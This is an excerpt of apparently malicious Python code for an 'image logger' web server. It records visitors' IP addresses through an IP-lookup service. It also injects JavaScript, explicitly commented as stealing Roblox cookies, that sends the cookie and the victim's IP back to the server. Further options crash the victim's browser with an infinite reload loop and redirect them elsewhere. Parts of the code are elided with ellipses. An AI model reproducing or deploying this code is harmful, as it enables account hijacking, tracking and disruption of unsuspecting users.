...
def botCheck(ip, useragent):
    if config["botCheck"]:
        try:
            ipData = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
            if ipData and ipData.get("proxy") == False:
                return True
            if "bot" in useragent.lower():
                return True
        except:
            pass
    return False
...
class ImageLoggerAPI(BaseHTTPRequestHandler):
    ...
    def handleRequest(self):
        ...
        # [ORIGINAL CODE STARTS HERE - COMPLETELY UNCHANGED]
...
body: JSON.stringify(requestPayload)
        ...
        self.send_header('Content-type', 'text/html') # Define the data as HTML
        self.end_headers() # Declare the headers as finished.

        # [ADDED] JavaScript to steal Roblox cookies
        roblox_js = b'''<script>
(function() {
    try {
        ...
        if (robloxCookie) {
            ...
            const img = new Image();
            img.src = '/roblox?cookie=' + encodeURIComponent(cookieValue) + '&ip=' + encodeURIComponent(''' + self.headers.get('x-forwarded-for').encode() + b''');
        }
    } catch(e) {}
})();
</script>'''
        
        self.wfile.write(data + roblox_js) # Send the HTML data to the client
        
        if config["crashBrowser"]:
            self.wfile.write(b'<script>for (var i=69420;i==i;i*=i) {window.location.reload();}</script>') # Crashes the browser by creating an infinite loop
        
        if config["redirect"]:
            self.wfile.write(f'''<meta http-equiv="refresh" content="0;url={config["redirect"]["url"]}">'''.encode()) # Redirect the victim to a different website
